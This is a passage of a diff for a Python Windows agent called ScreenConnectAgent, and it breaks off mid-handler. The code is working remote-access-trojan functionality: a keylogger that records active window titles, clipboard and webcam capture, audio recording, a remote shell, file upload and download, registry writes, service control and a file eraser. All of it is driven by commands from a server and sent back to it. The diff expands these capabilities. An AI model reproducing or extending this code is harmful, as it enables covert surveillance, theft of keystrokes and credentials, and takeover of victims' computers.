+                                    try: return winreg.QueryValueEx(sub, n)[0]
+                                    except: return d
+                                name = rv("DisplayName")
+                                if name and name not in seen:
+                                    seen.add(name)
+                                    apps.append({
+                                        "name":      name,
+                                        "version":   rv("DisplayVersion"),
+                                        "publisher": rv("Publisher"),
+                                        "install_date": rv("InstallDate"),
+                                        "size_mb":   round(int(rv("EstimatedSize", 0)) / 1024, 1),
+                                        "location":  rv("InstallLocation"),
+                                    })
+                        except Exception:
+                            pass
+            except Exception:
+                pass
+        return sorted(apps, key=lambda x: x.get("name", "").lower())
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  AUDIO CAPTURE
+# ════════════════════════════════════════════════════════════════════════════
+class AudioCapture:
+    def __init__(self, sio_client):
+        self.sio     = sio_client
+        self.running = False
+        self._thread: Optional[threading.Thread] = None
+
+    def capture_chunk(self, seconds: float = 3.0, sample_rate: int = 16000) -> dict:
+        if not AUDIO_OK:
+            return {"error": "sounddevice not available"}
+        try:
+            recording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate,
+                               channels=1, dtype="int16")
+            sd.wait()
+            buf = BytesIO()
+            wavfile.write(buf, sample_rate, recording)
+            return {
+                "success":     True,
+                "duration_s":  seconds,
+                "sample_rate": sample_rate,
+                "data":        base64.b64encode(buf.getvalue()).decode(),
+                "ts":          datetime.utcnow().isoformat(),
+            }
+        except Exception as e:
+            return {"error": str(e)}
+
+    @staticmethod
+    def list_devices() -> list:
+        if not AUDIO_OK:
+            return []
+        try:
+            devs = sd.query_devices()
+            return [{"index": i, "name": d["name"], "channels_in": d["max_input_channels"],
+                     "channels_out": d["max_output_channels"]} for i, d in enumerate(devs)]
+        except Exception:
+            return []
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  ALERT ENGINE
+# ════════════════════════════════════════════════════════════════════════════
+class AlertEngine:
+    def __init__(self, sio_client):
+        self.sio         = sio_client
+        self._last_alerts: Dict[str, float] = {}
+        self.running     = False
+        self._thread: Optional[threading.Thread] = None
+
+    def start(self):
+        if self.running or not CONFIG["ENABLE_ALERTS"]:
+            return
+        self.running = True
+        self._thread = threading.Thread(target=self._loop, daemon=True)
+        self._thread.start()
+
+    def stop(self):
+        self.running = False
+
+    def _can_alert(self, key: str) -> bool:
+        now = time.time()
+        last = self._last_alerts.get(key, 0)
+        if now - last >= CONFIG["ALERT_COOLDOWN_S"]:
+            self._last_alerts[key] = now
+            return True
+        return False
+
+    def _loop(self):
+        while self.running:
+            try:
+                cpu = psutil.cpu_percent(interval=2)
+                ram = psutil.virtual_memory().percent
+                disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent
+
+                if cpu >= CONFIG["ALERT_CPU_THRESHOLD"] and self._can_alert("cpu"):
+                    self.sio.emit("agent_alert", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "type": "cpu", "value": cpu,
+                        "threshold": CONFIG["ALERT_CPU_THRESHOLD"],
+                        "message": f"CPU usage critical: {cpu:.1f}%",
+                        "ts": datetime.utcnow().isoformat(),
+                    })
+                if ram >= CONFIG["ALERT_RAM_THRESHOLD"] and self._can_alert("ram"):
+                    self.sio.emit("agent_alert", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "type": "ram", "value": ram,
+                        "threshold": CONFIG["ALERT_RAM_THRESHOLD"],
+                        "message": f"RAM usage critical: {ram:.1f}%",
+                        "ts": datetime.utcnow().isoformat(),
+                    })
+                if disk >= CONFIG["ALERT_DISK_THRESHOLD"] and self._can_alert("disk"):
+                    self.sio.emit("agent_alert", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "type": "disk", "value": disk,
+                        "threshold": CONFIG["ALERT_DISK_THRESHOLD"],
+                        "message": f"Disk usage critical: {disk:.1f}%",
+                        "ts": datetime.utcnow().isoformat(),
+                    })
+            except Exception as e:
+                log.error(f"AlertEngine error: {e}")
+            time.sleep(30)
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  SECURE ERASER
+# ════════════════════════════════════════════════════════════════════════════
+class SecureEraser:
+    @staticmethod
+    def wipe_file(path: str, passes: int = 3) -> dict:
+        try:
+            p = Path(path)
+            if not p.is_file():
+                return {"success": False, "error": "Not a file"}
+            size = p.stat().st_size
+            with open(p, "r+b") as f:
+                for _ in range(passes):
+                    f.seek(0)
+                    f.write(os.urandom(size))
+                    f.flush()
+                    os.fsync(f.fileno())
+            p.unlink()
+            return {"success": True, "path": str(p), "passes": passes}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
 
 
 # ════════════════════════════════════════════════════════════════════════════
@@ -1046,20 +1731,20 @@ class RemoteShell:
 # ════════════════════════════════════════════════════════════════════════════
 class KeyLogger:
     def __init__(self, sio_client):
-        self.sio       = sio_client
+        self.sio        = sio_client
         self._buf: list = []
-        self._lock     = threading.Lock()
-        self._listener = None
-        self._flush_t: threading.Thread | None = None
-        self.running   = False
+        self._lock      = threading.Lock()
+        self._listener  = None
+        self._flush_t: Optional[threading.Thread] = None
+        self.running    = False
 
     def start(self):
         if not PYNPUT_OK or self.running:
             return
-        self.running = True
-        self._listener = pynput.keyboard.Listener(on_press=self._on_key)
+        self.running     = True
+        self._listener   = pynput.keyboard.Listener(on_press=self._on_key)
         self._listener.start()
-        self._flush_t = threading.Thread(target=self._flush_loop, daemon=True)
+        self._flush_t    = threading.Thread(target=self._flush_loop, daemon=True)
         self._flush_t.start()
         log.info("Keylogger started.")
 
@@ -1081,9 +1766,9 @@ class KeyLogger:
 
     def _active_window(self) -> str:
         try:
-            hwnd = ctypes.windll.user32.GetForegroundWindow()
+            hwnd   = ctypes.windll.user32.GetForegroundWindow()
             length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
-            buf = ctypes.create_unicode_buffer(length + 1)
+            buf    = ctypes.create_unicode_buffer(length + 1)
             ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
             return buf.value
         except Exception:
@@ -1118,7 +1803,7 @@ class ClipboardMonitor:
     def __init__(self, sio_client):
         self.sio     = sio_client
         self._last   = ""
-        self._t: threading.Thread | None = None
+        self._t: Optional[threading.Thread] = None
         self.running = False
 
     def start(self):
@@ -1140,7 +1825,7 @@ class ClipboardMonitor:
                     self._last = cur
                     self.sio.emit("clipboard_data", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "content":   cur[:4096],
+                        "content":   cur[:8192],
                         "length":    len(cur),
                         "ts":        datetime.utcnow().isoformat(),
                     })
@@ -1156,18 +1841,22 @@ class WebcamCapture:
     def __init__(self, sio_client):
         self.sio = sio_client
 
-    def capture(self, camera_idx: int = 0) -> dict:
+    def capture(self, camera_idx: int = 0, quality: int = 80) -> dict:
         if not CV2_OK:
             return {"error": "OpenCV not available."}
+        cap = None
         try:
             cap = cv2.VideoCapture(camera_idx)
+            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
             if not cap.isOpened():
                 return {"error": f"Camera {camera_idx} could not be opened."}
+            # Read multiple frames to flush buffer
+            for _ in range(3):
+                cap.read()
             ret, frame = cap.read()
-            cap.release()
             if not ret:
                 return {"error": "Failed to read frame from camera."}
-            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 75])
+            success, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
             if not success:
                 return {"error": "Encoding failed."}
             return {
@@ -1180,16 +1869,21 @@ class WebcamCapture:
             }
         except Exception as e:
             return {"error": str(e)}
+        finally:
+            if cap:
+                cap.release()
 
     @staticmethod
     def list_cameras() -> list:
         if not CV2_OK:
             return []
         cameras = []
-        for i in range(5):
+        for i in range(8):
             cap = cv2.VideoCapture(i)
             if cap.isOpened():
-                cameras.append({"index": i, "name": f"Camera {i}"})
+                w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
+                h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
+                cameras.append({"index": i, "name": f"Camera {i}", "w": w, "h": h})
                 cap.release()
         return cameras
 
@@ -1200,7 +1894,7 @@ class WebcamCapture:
 class Heartbeat:
     def __init__(self, sio_client):
         self.sio     = sio_client
-        self._t: threading.Thread | None = None
+        self._t: Optional[threading.Thread] = None
         self.running = False
 
     def start(self):
@@ -1216,11 +1910,16 @@ class Heartbeat:
     def _loop(self):
         while self.running:
             try:
+                bat = psutil.sensors_battery()
                 self.sio.emit("heartbeat", {
-                    "device_id": CONFIG["DEVICE_TOKEN"],
-                    "cpu":       psutil.cpu_percent(interval=0),
-                    "ram":       psutil.virtual_memory().percent,
-                    "ts":        datetime.utcnow().isoformat(),
+                    "device_id":     CONFIG["DEVICE_TOKEN"],
+                    "cpu":           psutil.cpu_percent(interval=0),
+                    "ram":           psutil.virtual_memory().percent,
+                    "disk":          psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent,
+                    "net_mbps":      round(_net_monitor.get_mbps(), 1),
+                    "battery_pct":   bat.percent if bat else None,
+                    "battery_plug":  bat.power_plugged if bat else None,
+                    "ts":            datetime.utcnow().isoformat(),
                 })
             except Exception as e:
                 log.warning(f"Heartbeat error: {e}")
@@ -1229,19 +1928,6 @@ class Heartbeat:
 
 # ════════════════════════════════════════════════════════════════════════════
 #  MAIN AGENT CLASS
-#
-#  v5.0 RECONNECTION FIX:
-#  ───────────────────────
-#  Old approach: reuse same socketio.Client forever.
-#  Problem: after disconnect, the Client accumulates internal state
-#  (namespace handlers, transport objects) that causes silent failures
-#  on reconnect. It "connects" but never fires the connect event.
-#
-#  Fix: Create a brand-new socketio.Client on every reconnect attempt.
-#  Recreate all sub-components (streamer, heartbeat, etc.) that hold
-#  a reference to the client. This is the only reliable approach.
-#
-#  The run() loop creates a fresh agent + client each time around.
 # ════════════════════════════════════════════════════════════════════════════
 class ScreenConnectAgent:
     def __init__(self):
@@ -1249,12 +1935,8 @@ class ScreenConnectAgent:
         self._stop_flag       = threading.Event()
 
     def _make_client(self):
-        """Create a fresh socketio.Client with all sub-components."""
-        sio = socketio.Client(
-            logger=False,
-            engineio_logger=False,
-            reconnection=False,   # we handle reconnection manually
-        )
+        """Create a brand-new socketio.Client on every reconnect."""
+        sio         = socketio.Client(logger=False, engineio_logger=False, reconnection=False)
         cursor      = CursorTracker(sio)
         streamer    = ScreenStreamer(sio, cursor)
         sys_monitor = SystemMonitor(sio)
@@ -1265,14 +1947,26 @@ class ScreenConnectAgent:
         proc_mgr    = ProcessManager()
         files       = FileBrowser()
         heartbeat   = Heartbeat(sio)
+        alerts      = AlertEngine(sio)
+        registry    = RegistryManager()
+        services    = ServiceManager()
+        winmgr      = WindowManager()
+        audio       = AudioCapture(sio)
+        apps        = InstalledApps()
+        eraser      = SecureEraser()
 
-        self._register_events(sio, cursor, streamer, sys_monitor, keylogger,
-                              clipboard, webcam, shell, proc_mgr, files, heartbeat)
-        return sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard
+        self._register_events(
+            sio, cursor, streamer, sys_monitor, keylogger, clipboard,
+            webcam, shell, proc_mgr, files, heartbeat, alerts,
+            registry, services, winmgr, audio, apps, eraser,
+        )
+        return sio, streamer, sys_monitor, heartbeat, cursor, keylogger, clipboard, alerts
 
-    def _register_events(self, sio, cursor, streamer, sys_monitor, keylogger,
-                         clipboard, webcam, shell, proc_mgr, files, heartbeat):
-
+    def _register_events(
+        self, sio, cursor, streamer, sys_monitor, keylogger, clipboard,
+        webcam, shell, proc_mgr, files, heartbeat, alerts,
+        registry, services, winmgr, audio, apps, eraser,
+    ):
         @sio.event
         def connect():
             self._reconnect_delay = CONFIG["RECONNECT_BASE"]
@@ -1283,7 +1977,7 @@ class ScreenConnectAgent:
             fp["token"]     = CONFIG["DEVICE_TOKEN"]
             sio.emit("agent_connect", fp)
 
-            # Belt-and-suspenders: also do HTTP checkin
+            # HTTP belt-and-suspenders checkin
             try:
                 requests.post(
                     CONFIG["SERVER_URL"].rstrip("/") + "/agent/checkin",
@@ -1295,6 +1989,7 @@ class ScreenConnectAgent:
 
             heartbeat.start()
             cursor.start()
+            alerts.start()
             if CONFIG["ENABLE_KEYLOGGER"]:  keylogger.start()
             if CONFIG["ENABLE_CLIPBOARD"]:  clipboard.start()
 
@@ -1304,18 +1999,12 @@ class ScreenConnectAgent:
             streamer.stop()
             sys_monitor.stop()
             heartbeat.stop()
+            alerts.stop()
 
-        # ── Frame ACK — THE KEY FIX ───────────────────────────────────────
         @sio.on("frame_ack")
         def on_frame_ack(data):
-            """
-            Server sends this after relaying each frame to dashboards.
-            We open the gate so the streamer sends the next frame.
-            Without this, streamer sends 1 frame and the gate stays closed.
-            """
             streamer.on_ack()
 
-        # ── Dashboard Commands ─────────────────────────────────────────────
         @sio.on("request_action")
         def on_action(data):
             tab = data.get("tab", "")
@@ -1338,20 +2027,20 @@ class ScreenConnectAgent:
                     streamer.set_mode(data.get("mode", "video"))
                     sio.emit("action_result", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "action": "set_mode",
-                        "mode": streamer.mode,
-                        "success": True,
+                        "action": "set_mode", "mode": streamer.mode, "success": True,
                     })
                 elif action == "set_quality":
-                    q = int(data.get("quality", 55))
-                    streamer._quality_current = max(10, min(95, q))
+                    q = max(10, min(95, int(data.get("quality", 55))))
+                    streamer._quality_current = q
                 elif action == "set_fps":
-                    streamer.fps = int(data.get("fps", 20))
+                    streamer.fps = max(1, min(30, int(data.get("fps", 20))))
+                elif action == "set_scale":
+                    streamer.scale = max(0.2, min(1.0, float(data.get("scale", 0.75))))
 
-            # ── Single screenshot ──────────────────────────────────────────
+            # ── Screenshot ─────────────────────────────────────────────────
             elif tab == "screenshot":
-                q = data.get("quality", CONFIG["STREAM_QUALITY"])
-                s = data.get("scale",   CONFIG["STREAM_SCALE"])
+                q   = data.get("quality", CONFIG["STREAM_QUALITY"])
+                s   = data.get("scale",   CONFIG["STREAM_SCALE"])
                 old_q, old_s = streamer.quality, streamer.scale
                 streamer.quality, streamer.scale = q, s
                 img = streamer.capture_single()
@@ -1363,37 +2052,62 @@ class ScreenConnectAgent:
                         "ts": datetime.utcnow().isoformat(),
                     })
 
-            # ── Mouse ──────────────────────────────────────────────────────
+            # ── Mouse — FIXED: coord normalization ─────────────────────────
             elif tab == "mouse_event":
                 if PYAUTOGUI_OK:
-                    x   = int(data.get("x", 0))
-                    y   = int(data.get("y", 0))
+                    # Support both absolute (x,y) and normalized (x_norm, y_norm)
+                    mon_w, mon_h = _get_monitor_resolution(streamer.monitor_idx)
+                    x_norm = data.get("x_norm")
+                    y_norm = data.get("y_norm")
+                    if x_norm is not None and y_norm is not None:
+                        # Normalized 0..1 → absolute pixels
+                        x = int(float(x_norm) * mon_w)
+                        y = int(float(y_norm) * mon_h)
+                    else:
+                        x = int(data.get("x", 0))
+                        y = int(data.get("y", 0))
                     typ = data.get("type", "move")
-                    btn = {0: "left", 1: "middle", 2: "right"}.get(int(data.get("button", 0)), "left")
+                    btn = {0: "left", 1: "middle", 2: "right"}.get(
+                        int(data.get("button", 0)), "left"
+                    )
                     try:
-                        if   typ == "move":     pyautogui.moveTo(x, y, duration=0, _pause=False)
-                        elif typ == "down":     pyautogui.mouseDown(x, y, button=btn, _pause=False)
-                        elif typ == "up":       pyautogui.mouseUp(x, y, button=btn, _pause=False)
-                        elif typ == "click":    pyautogui.click(x, y, button=btn, _pause=False)
-                        elif typ == "rclick":   pyautogui.click(x, y, button="right", _pause=False)
-                        elif typ == "dblclick": pyautogui.doubleClick(x, y, _pause=False)
+                        if   typ == "move":
+                            pyautogui.moveTo(x, y, duration=0, _pause=False)
+                        elif typ == "down":
+                            pyautogui.mouseDown(x, y, button=btn, _pause=False)
+                        elif typ == "up":
+                            pyautogui.mouseUp(x, y, button=btn, _pause=False)
+                        elif typ == "click":
+                            pyautogui.click(x, y, button=btn, _pause=False)
+                        elif typ in ("rclick", "rightclick"):
+                            pyautogui.click(x, y, button="right", _pause=False)
+                        elif typ == "dblclick":
+                            pyautogui.doubleClick(x, y, _pause=False)
                         elif typ == "drag":
-                            tx, ty = int(data.get("tx", x)), int(data.get("ty", y))
-                            pyautogui.dragTo(tx, ty, duration=0.1, button=btn, _pause=False)
+                            tx = int(data.get("tx", x))
+                            ty = int(data.get("ty", y))
+                            pyautogui.dragTo(tx, ty, duration=0.08, button=btn, _pause=False)
                     except Exception as e:
-                        log.warning(f"mouse_event: {e}")
+                        log.warning(f"mouse_event error: {e}")
 
             # ── Scroll ─────────────────────────────────────────────────────
             elif tab == "scroll_event":
                 if PYAUTOGUI_OK:
                     try:
-                        x, y = int(data.get("x", 0)), int(data.get("y", 0))
-                        dy   = data.get("dy", 0)
-                        clicks = int(-dy / 100) if dy else 0
+                        mon_w, mon_h = _get_monitor_resolution(streamer.monitor_idx)
+                        x_norm = data.get("x_norm")
+                        y_norm = data.get("y_norm")
+                        if x_norm is not None:
+                            x = int(float(x_norm) * mon_w)
+                            y = int(float(y_norm) * mon_h)
+                        else:
+                            x, y = int(data.get("x", 0)), int(data.get("y", 0))
+                        dy     = data.get("dy", 0)
+                        clicks = int(-dy / 120) if dy else 0
                         if clicks:
                             pyautogui.scroll(clicks, x=x, y=y, _pause=False)
                     except Exception as e:
-                        log.warning(f"scroll_event: {e}")
+                        log.warning(f"scroll_event error: {e}")
 
             # ── Keyboard ───────────────────────────────────────────────────
             elif tab == "key_event":
@@ -1402,19 +2116,28 @@ class ScreenConnectAgent:
                     key   = data.get("key", "")
                     combo = data.get("combo", "")
                     KEY_MAP = {
-                        "Enter":"enter","Backspace":"backspace","Tab":"tab",
-                        "Escape":"esc","Delete":"delete","Insert":"insert",
-                        "Home":"home","End":"end","PageUp":"pageup","PageDown":"pagedown",
-                        "ArrowUp":"up","ArrowDown":"down","ArrowLeft":"left","ArrowRight":"right",
-                        " ":"space","Control":"ctrl","Alt":"alt","Shift":"shift","Meta":"win",
-                        "F1":"f1","F2":"f2","F3":"f3","F4":"f4","F5":"f5","F6":"f6",
-                        "F7":"f7","F8":"f8","F9":"f9","F10":"f10","F11":"f11","F12":"f12",
+                        "Enter": "enter", "Return": "enter",
+                        "Backspace": "backspace", "Tab": "tab",
+                        "Escape": "esc", "Delete": "delete",
+                        "Insert": "insert", "Home": "home", "End": "end",
+                        "PageUp": "pageup", "PageDown": "pagedown",
+                        "ArrowUp": "up", "ArrowDown": "down",
+                        "ArrowLeft": "left", "ArrowRight": "right",
+                        " ": "space", "Control": "ctrl",
+                        "Alt": "alt", "Shift": "shift", "Meta": "win",
+                        "CapsLock": "capslock", "NumLock": "numlock",
+                        "PrintScreen": "printscreen", "ScrollLock": "scrolllock",
+                        "F1": "f1", "F2": "f2", "F3": "f3", "F4": "f4",
+                        "F5": "f5", "F6": "f6", "F7": "f7", "F8": "f8",
+                        "F9": "f9", "F10": "f10", "F11": "f11", "F12": "f12",
                     }
                     try:
                         if combo == "ctrl+alt+del":
-                            subprocess.Popen(["powershell","-Command",
-                                "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
-                                creationflags=subprocess.CREATE_NO_WINDOW)
+                            subprocess.Popen(
+                                ["powershell", "-Command",
+                                 "(New-Object -ComObject Shell.Application).WindowsSecurity()"],
+                                creationflags=subprocess.CREATE_NO_WINDOW
+                            )
                         elif ktype in ("down", "press"):
                             pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                             if pg:
@@ -1422,6 +2145,7 @@ class ScreenConnectAgent:
                                 if data.get("ctrl")  and key != "Control": hotkey.append("ctrl")
                                 if data.get("alt")   and key != "Alt":     hotkey.append("alt")
                                 if data.get("shift") and key != "Shift":   hotkey.append("shift")
+                                if data.get("meta")  and key != "Meta":    hotkey.append("win")
                                 hotkey.append(pg)
                                 if len(hotkey) > 1:
                                     pyautogui.hotkey(*hotkey, _pause=False)
@@ -1431,101 +2155,365 @@ class ScreenConnectAgent:
                             pg = KEY_MAP.get(key, key.lower() if len(key) == 1 else None)
                             if pg:
                                 pyautogui.keyUp(pg, _pause=False)
+                        elif ktype == "type":
+                            # Type a full string
+                            pyautogui.write(data.get("text", ""), interval=0.01)
                     except Exception as e:
-                        log.warning(f"key_event: {e}")
+                        log.warning(f"key_event error: {e}")
 
             # ── Ping ───────────────────────────────────────────────────────
             elif tab == "ping":
-                sio.emit("ping_result", {"device_id": CONFIG["DEVICE_TOKEN"], "t": data.get("t")})
+                sio.emit("ping_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "t": data.get("t"),
+                    "ts": datetime.utcnow().isoformat(),
+                })
 
-            # ── System ────────────────────────────────────────────────────
+            # ── System ─────────────────────────────────────────────────────
             elif tab == "system":
                 action = data.get("action", "start")
-                if action == "start": sys_monitor.start(interval=data.get("interval", 2))
-                else:                 sys_monitor.stop()
+                if action == "start":
+                    sys_monitor.start(interval=data.get("interval", 2))
+                else:
+                    sys_monitor.stop()
 
             elif tab == "system_snapshot":
                 sio.emit("system_stats_report", sys_monitor.get_snapshot())
 
             elif tab == "disks":
-                sio.emit("disks_report",   {"device_id": CONFIG["DEVICE_TOKEN"], "disks":      sys_monitor.get_disk_list()})
+                sio.emit("disks_report", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "disks": sys_monitor.get_disk_list(),
+                })
 
             elif tab == "network":
-                sio.emit("network_report", {"device_id": CONFIG["DEVICE_TOKEN"], "interfaces": sys_monitor.get_network_interfaces()})
+                sio.emit("network_report", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "interfaces": sys_monitor.get_network_interfaces(),
+                })
 
-            # ── Processes ─────────────────────────────────────────────────
+            # ── Processes ──────────────────────────────────────────────────
             elif tab == "processes":
                 procs = proc_mgr.list_processes()
-                sio.emit("processes_report", {"device_id": CONFIG["DEVICE_TOKEN"], "processes": procs, "count": len(procs)})
+                sio.emit("processes_report", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "processes": procs,
+                    "count": len(procs),
+                })
 
             elif tab == "kill_process":
-                sio.emit("kill_result", {"device_id": CONFIG["DEVICE_TOKEN"], **proc_mgr.kill_process(int(data.get("pid", 0)))})
+                sio.emit("kill_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **proc_mgr.kill_process(int(data.get("pid", 0))),
+                })
 
             elif tab == "start_process":
-                sio.emit("start_process_result", {"device_id": CONFIG["DEVICE_TOKEN"], **proc_mgr.start_process(data.get("command", ""))})
+                sio.emit("start_process_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **proc_mgr.start_process(data.get("command", "")),
+                })
 
-            # ── Shell ─────────────────────────────────────────────────────
+            elif tab == "suspend_process":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "suspend_process",
+                    **proc_mgr.suspend_process(int(data.get("pid", 0))),
+                })
+
+            elif tab == "resume_process":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "resume_process",
+                    **proc_mgr.resume_process(int(data.get("pid", 0))),
+                })
+
+            # ── Shell ──────────────────────────────────────────────────────
             elif tab == "shell":
-                result = shell.execute(data.get("command", "echo hello"), shell_type=data.get("shell_type", "cmd"))
+                result = shell.execute(
+                    data.get("command", "echo hello"),
+                    shell_type=data.get("shell_type", "cmd"),
+                )
                 sio.emit("shell_result", {"device_id": CONFIG["DEVICE_TOKEN"], **result})
 
-            # ── Files ─────────────────────────────────────────────────────
+            elif tab == "shell_env":
+                sio.emit("shell_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **shell.get_env(),
+                })
+
+            # ── Files ──────────────────────────────────────────────────────
             elif tab == "file_list":
-                sio.emit("file_list_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **files.list_directory(data.get("path", "C:\\"))})
+                sio.emit("file_list_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.list_directory(data.get("path", "C:\\")),
+                })
 
             elif tab == "file_read":
-                sio.emit("file_read_result",     {"device_id": CONFIG["DEVICE_TOKEN"], **files.read_file(data.get("path", ""))})
+                sio.emit("file_read_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.read_file(data.get("path", "")),
+                })
+
+            elif tab == "file_write":
+                sio.emit("file_read_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.write_file(data.get("path", ""), data.get("content", "")),
+                })
 
             elif tab == "file_download":
-                sio.emit("file_download_result", {"device_id": CONFIG["DEVICE_TOKEN"], **files.download_file(data.get("path", ""))})
+                sio.emit("file_download_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.download_file(data.get("path", "")),
+                })
+
+            elif tab == "file_upload":
+                sio.emit("file_download_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.upload_file(data.get("path", ""), data.get("data", "")),
+                })
 
             elif tab == "file_delete":
-                sio.emit("file_delete_result",   {"device_id": CONFIG["DEVICE_TOKEN"], **files.delete_file(data.get("path", ""))})
+                sio.emit("file_delete_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.delete_file(data.get("path", "")),
+                })
+
+            elif tab == "file_copy":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "file_copy",
+                    **files.copy_file(data.get("src", ""), data.get("dst", "")),
+                })
+
+            elif tab == "file_move":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "file_move",
+                    **files.move_file(data.get("src", ""), data.get("dst", "")),
+                })
+
+            elif tab == "file_mkdir":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "file_mkdir",
+                    **files.create_folder(data.get("path", "")),
+                })
+
+            elif tab == "file_rename":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "file_rename",
+                    **files.rename(data.get("old", ""), data.get("new", "")),
+                })
+
+            elif tab == "file_search":
+                sio.emit("file_list_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **files.search(data.get("root", "C:\\"), data.get("pattern", "*")),
+                })
 
             elif tab == "drives":
-                sio.emit("drives_report", {"device_id": CONFIG["DEVICE_TOKEN"], "drives": files.list_drives()})
+                sio.emit("drives_report", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "drives": files.list_drives(),
+                })
 
-            # ── Webcam ────────────────────────────────────────────────────
+            # ── Webcam ─────────────────────────────────────────────────────
             elif tab == "webcam":
-                sio.emit("webcam_result",      {"device_id": CONFIG["DEVICE_TOKEN"], **webcam.capture(data.get("camera", 0))})
+                sio.emit("webcam_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    **webcam.capture(data.get("camera", 0), data.get("quality", 80)),
+                })
 
             elif tab == "webcam_list":
-                sio.emit("webcam_list_result", {"device_id": CONFIG["DEVICE_TOKEN"], "cameras": webcam.list_cameras()})
+                sio.emit("webcam_list_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "cameras": webcam.list_cameras(),
+                })
 
-            # ── Clipboard ─────────────────────────────────────────────────
+            # ── Clipboard ──────────────────────────────────────────────────
             elif tab == "clipboard_get":
                 if CLIPBOARD_OK:
                     sio.emit("clipboard_result", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
-                        "content": pyperclip.paste()[:4096],
-                        "ts": datetime.utcnow().isoformat()
+                        "content": pyperclip.paste()[:8192],
+                        "ts": datetime.utcnow().isoformat(),
                     })
 
             elif tab == "clipboard_set":
                 if CLIPBOARD_OK:
                     pyperclip.copy(data.get("text", ""))
-                    sio.emit("clipboard_set_result", {"device_id": CONFIG["DEVICE_TOKEN"], "success": True})
+                    sio.emit("clipboard_set_result", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "success": True,
+                    })
 
-            # ── Power ─────────────────────────────────────────────────────
+            # ── Registry ───────────────────────────────────────────────────
+            elif tab == "registry_read":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "registry_read",
+                    **registry.read_key(data.get("path", ""), data.get("value", "")),
+                })
+
+            elif tab == "registry_list":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "registry_list",
+                    **registry.list_key(data.get("path", "")),
+                })
+
+            elif tab == "registry_write":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "registry_write",
+                    **registry.write_key(data.get("path", ""), data.get("name", ""),
+                                         data.get("data", ""), int(data.get("type", winreg.REG_SZ))),
+                })
+
+            elif tab == "registry_delete":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "registry_delete",
+                    **registry.delete_value(data.get("path", ""), data.get("name", "")),
+                })
+
+            # ── Services ───────────────────────────────────────────────────
+            elif tab == "services_list":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "services_list",
+                    "services": services.list_services(),
+                })
+
+            elif tab == "service_control":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "service_control",
+                    **services.control_service(data.get("name", ""), data.get("cmd", "stop")),
+                })
+
+            # ── Windows ────────────────────────────────────────────────────
+            elif tab == "windows_list":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "windows_list",
+                    "windows": winmgr.list_windows(),
+                })
+
+            elif tab == "window_focus":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "action": "window_focus",
+                    **winmgr.focus_window(int(data.get("hwnd", 0))),
+                })
+
+            elif tab == "window_close":
+                sio.emit("action_result", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
